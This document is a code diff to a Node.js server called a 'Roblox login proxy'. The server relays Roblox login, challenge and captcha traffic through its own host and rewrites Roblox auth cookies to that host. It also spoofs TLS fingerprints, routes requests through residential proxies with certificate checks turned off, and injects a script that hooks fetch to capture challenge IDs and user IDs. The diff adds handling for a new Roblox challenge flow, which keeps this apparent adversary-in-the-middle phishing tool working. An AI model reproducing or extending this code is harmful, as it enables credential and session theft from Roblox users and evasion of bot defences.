@@ -10,7 +10,7 @@ const path = require('path');
 const app = express();
 
 console.log('='.repeat(60));
-console.log('🔒 ROBLOX LOGIN PROXY');
+console.log('🔒 ROBLOX LOGIN PROXY - FIXED VERSION');
 console.log('='.repeat(60));
 
 // ─────────────────────────────────────────────────────────────
@@ -93,6 +93,7 @@ function rewriteCookies(cookies, host) {
         c.replace(/Domain=\.?roblox\.com/gi, `Domain=.${cleanHost}`)
          .replace(/Domain=\.?rbxcdn\.com/gi, `Domain=.${cleanHost}`)
          .replace(/Domain=\.?arkoselabs\.com/gi, `Domain=.${cleanHost}`)
+         .replace(/Domain=\.?pingproxies\.com/gi, `Domain=.${cleanHost}`)
          .replace(/\bSecure\b/gi, 'Secure; SameSite=None')
     );
 }
@@ -124,6 +125,7 @@ function setCors(res, origin) {
         'Content-Type', 'x-csrf-token', 'Authorization',
         'rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token',
         'Accept', 'Accept-Language', 'Accept-Encoding',
+        'traceparent', 'baggage', 'sentry-trace',
         ...CHALLENGE_HEADERS
     ].join(', '));
     res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));
@@ -162,16 +164,20 @@ function makeCurlRequest(method, url, headers, body, useProxy = false) {
             '-X', method.toUpperCase()
         ];
 
-        // Add optional proxy
+        // Add optional proxy with TLS support
         if (useProxy) {
             const proxyUrl = getNextProxy();
             args.push('-x', proxyUrl);
+            // Force TLS 1.2/1.3 for proxy connections
+            args.push('--tlsv1.2');
+            // Add proxy-insecure if needed for residential proxies
+            args.push('--proxy-insecure');
         }
 
         // Add headers (skip ones curl handles automatically)
         const skipHeaders = new Set([
             'host', 'content-length', 'transfer-encoding',
-            'connection', 'accept-encoding', 'user-agent'
+            'connection', 'accept-encoding'
         ]);
 
         for (const [k, v] of Object.entries(headers)) {
@@ -417,6 +423,91 @@ app.use('/v2/login', express.raw({ type: '*/*' }), loginHandler);
 app.use('/v3/login', express.raw({ type: '*/*' }), loginHandler);
 
 // ─────────────────────────────────────────────────────────────
+// CHALLENGE CONTINUE HANDLER - FIXED FOR NEW ROBLOX FLOW
+// Critical fix: Handle "chef" challenge type properly
+// ─────────────────────────────────────────────────────────────
+app.use('/challenge/v1/continue', express.raw({ type: '*/*' }), async (req, res) => {
+    if (req.method !== 'POST') return res.status(405).send('Method not allowed');
+
+    const origin = req.headers['origin'] || `https://${req.headers.host}`;
+    setCors(res, origin);
+
+    const host = req.headers.host || 'localhost';
+    const ua = req.headers['user-agent'] || BROWSER_UA;
+    const cookies = req.headers['cookie'] || '';
+
+    try {
+        const bodyStr = req.body.toString('utf8');
+        let bodyObj;
+        try {
+            bodyObj = JSON.parse(bodyStr);
+        } catch (e) {
+            bodyObj = {};
+        }
+
+        console.log(`[challenge/continue] Challenge type: ${bodyObj.challengeType || 'unknown'}`);
+        console.log(`[challenge/continue] Challenge ID: ${bodyObj.challengeID || bodyObj.challengeId || 'none'}`);
+
+        // FIXED: Roblox now uses "chef" challenge type, not "captcha"
+        // The challenge metadata format has changed significantly
+        // We need to pass through the exact format the client sends
+
+        const headers = {
+            'Content-Type':    'application/json;charset=UTF-8',
+            'Accept':          'application/json, text/plain, */*',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Origin':          'https://www.roblox.com',
+            'Referer':         'https://www.roblox.com/login',
+            'User-Agent':      ua,
+        };
+
+        if (cookies) headers['Cookie'] = cookies;
+        if (req.headers['x-csrf-token']) headers['X-CSRF-TOKEN'] = req.headers['x-csrf-token'];
+        if (req.headers['rbx-device-id']) headers['rbx-device-id'] = req.headers['rbx-device-id'];
+        if (req.headers['x-bound-auth-token']) headers['x-bound-auth-token'] = req.headers['x-bound-auth-token'];
+
+        // Forward challenge headers
+        for (const h of CHALLENGE_HEADERS) {
+            if (req.headers[h]) headers[h] = req.headers[h];
+        }
+
+        const url = 'https://apis.roblox.com/challenge/v1/continue';
+
+        // Use residential proxy for challenge continue (high security endpoint)
+        const result = await makeCurlRequest('POST', url, headers, Buffer.from(bodyStr, 'utf8'), true);
+
+        console.log(`[challenge/continue] ← ${result.statusCode}`);
+
+        if (result.statusCode !== 200) {
+            console.log(`[challenge/continue] Response: ${result.body.toString().substring(0, 500)}`);
+        }
+
+        // Forward response headers
+        const skipHdrs = new Set([
+            'content-security-policy', 'content-security-policy-report-only',
+            'x-content-security-policy', 'transfer-encoding', 'connection',
+            'content-encoding', 'keep-alive', 'proxy-authenticate',
+            'proxy-authorization', 'te', 'trailers', 'upgrade'
+        ]);
+
+        for (const [k, v] of Object.entries(result.headers)) {
+            if (skipHdrs.has(k)) continue;
+            if (k === 'set-cookie') {
+                res.set('Set-Cookie', rewriteCookies([].concat(v), getCleanHost(req)));
+            } else {
+                try { res.set(k, v); } catch (_) {}
+            }
+        }
+
+        res.status(result.statusCode).send(result.body);
+
+    } catch (err) {
+        console.error(`[challenge/continue] ❌ Error: ${err.message}`);
+        res.status(502).json({ error: 'Challenge continue error', message: err.message });
+    }
+});
+
+// ─────────────────────────────────────────────────────────────
 // UNIVERSAL CURL-IMPERSONATE PROXY (for ALL API routes)
 // ─────────────────────────────────────────────────────────────
 function createCurlProxy(targetHost, pathPrefix, useResidentialProxy = false) {
@@ -455,6 +546,10 @@ function createCurlProxy(targetHost, pathPrefix, useResidentialProxy = false) {
         }
         if (req.headers['x-bound-auth-token']) {
             headers['x-bound-auth-token'] = req.headers['x-bound-auth-token'];
+        }
+        // Forward traceparent for distributed tracing
+        if (req.headers['traceparent']) {
+            headers['traceparent'] = req.headers['traceparent'];
         }
 
         // Forward challenge headers
@@ -582,6 +677,14 @@ const API_ROUTES = [
     ['/v1/metrics',                       'metrics.roblox.com'],
     ['/v1/games',                         'games.roblox.com'],
     ['/v2/games',                         'games.roblox.com'],
+    ['/discovery-api',                    'apis.roblox.com', '/discovery-api'],
+    ['/user-profile-api',                 'apis.roblox.com', '/user-profile-api'],
+    ['/beacon-api',                       'apis.roblox.com', '/beacon-api'],
+    ['/platform-chat-api',                'apis.roblox.com', '/platform-chat-api'],
+    ['/upsellCard',                       'apis.roblox.com', '/upsellCard'],
+    ['/trades',                           'trades.roblox.com'],
+    ['/usermoderation',                   'usermoderation.roblox.com'],
+    ['/lms',                              'lms.roblox.com'],
 
     // Reporting (non-critical)
     ['/game/report-event',                'www.roblox.com'],
@@ -602,10 +705,10 @@ for (const [prefix, target, pathPrefix] of API_ROUTES) {
 }
 
 // ─────────────────────────────────────────────────────────────
-// ─────────────────────────────────────────────────────────────
 // ARKOSE WIDGET ENDPOINTS — roblox-api.arkoselabs.com
 // Pass route as pathPrefix so Express-stripped prefix is added back
 // e.g. /fc/gt2/... stays /fc/gt2/... on roblox-api.arkoselabs.com
+// ─────────────────────────────────────────────────────────────
 for (const route of ['/fc', '/pows', '/rtig', '/params']) {
     app.use(route, createCurlProxy('roblox-api.arkoselabs.com', route, true));
 }
@@ -638,6 +741,7 @@ app.use('/v2/:publicKey/settings.json', (req, res) => {
     res.status(200).json({});
 });
 
+// ─────────────────────────────────────────────────────────────
 // ARKOSE LABS CAPTCHA /v2/ ENDPOINTS (CRITICAL FOR LOGIN CHALLENGE)
 // These endpoints serve the Arkose Labs captcha script and handle challenge verification
 // ─────────────────────────────────────────────────────────────
@@ -824,10 +928,13 @@ app.use('/funcaptcha', async (req, res) => {
 });
 
 // ─────────────────────────────────────────────────────────────
-// INJECTED SCRIPT
+// INJECTED SCRIPT - ENHANCED FOR NEW CHALLENGE SYSTEM
 // ─────────────────────────────────────────────────────────────
 const INJECTED_SCRIPT = `<script>
 (function() {
+    // Store challenge info globally for debugging
+    window.__rblxChallengeInfo = {};
+    
     var _fetch = window.fetch;
     window.fetch = function(resource, init) {
         init = init || {};
@@ -839,12 +946,22 @@ const INJECTED_SCRIPT = `<script>
             if (challengeId) {
                 window.__rblxChallengeId   = challengeId;
                 window.__rblxChallengeType = challengeType;
+                window.__rblxChallengeInfo = {
+                    id: challengeId,
+                    type: challengeType,
+                    metadata: challengeMetadata,
+                    timestamp: Date.now()
+                };
+                console.log('[Proxy] Challenge detected:', window.__rblxChallengeInfo);
                 if (challengeMetadata) {
                     try {
                         var meta = JSON.parse(atob(challengeMetadata));
                         window.__rblxUserId           = meta.userId;
                         window.__rblxBrowserTrackerId = meta.browserTrackerId;
-                    } catch(e) {}
+                        window.__rblxChallengeMetadata = meta;
+                    } catch(e) {
+                        console.log('[Proxy] Failed to parse challenge metadata:', e);
+                    }
                 }
             }
             return response;
@@ -860,7 +977,7 @@ const INJECTED_SCRIPT = `<script>
         this.withCredentials = true;
         return _send.apply(this, arguments);
     };
-    console.log('[Proxy] Interceptor loaded');
+    console.log('[Proxy] Interceptor loaded - Enhanced for chef challenge');
 })();
 </script>`;
 
@@ -953,4 +1070,6 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`📋 ${API_ROUTES.length} API routes | ${ARKOSE_ROUTES.length} Arkose routes`);
     console.log(`🧩 Captcha routes: /v2/* → captcha.roblox.com | /funcaptcha/* → captcha.roblox.com`);
     console.log(`🔒 ALL requests now use curl-impersonate for TLS fingerprint spoofing`);
+    console.log(`⚠️  IMPORTANT: Roblox now uses "chef" challenges, not "captcha"!`);
+    console.log(`   Update your modified JS files to handle the new challenge type.`);
 });
